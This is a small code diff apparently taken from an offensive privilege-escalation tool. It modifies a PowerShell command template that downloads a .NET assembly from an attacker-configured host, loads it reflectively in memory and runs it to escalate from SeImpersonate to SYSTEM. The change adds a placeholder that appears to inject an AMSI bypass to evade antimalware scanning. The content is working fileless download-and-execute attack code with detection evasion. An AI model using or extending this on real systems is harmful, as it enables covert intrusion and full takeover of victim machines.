@@ -318,7 +318,7 @@ def _impersonation_ladder():
                 key=f"seimpersonate:ps-{slug}", delivery="inmem-fileless", detection="moderate",
                 title=f"SeImpersonate → SYSTEM ({tool}, in-memory reflective load)",
                 needs=f"{tool} in the arsenal + a reachable lhost (config set lhost=)",
-                command=("powershell -ep bypass -c \"$a=[Reflection.Assembly]::Load("
+                command=("powershell -ep bypass -c \"{amsi}$a=[Reflection.Assembly]::Load("
                          "(New-Object Net.WebClient).DownloadData('{url}{served}'));"
                          f"$a.EntryPoint.Invoke($null,@(,[string[]]@({_ps_array(args)})))\""),
                 cleanup=None, shell="cmd", serves=(tool,),
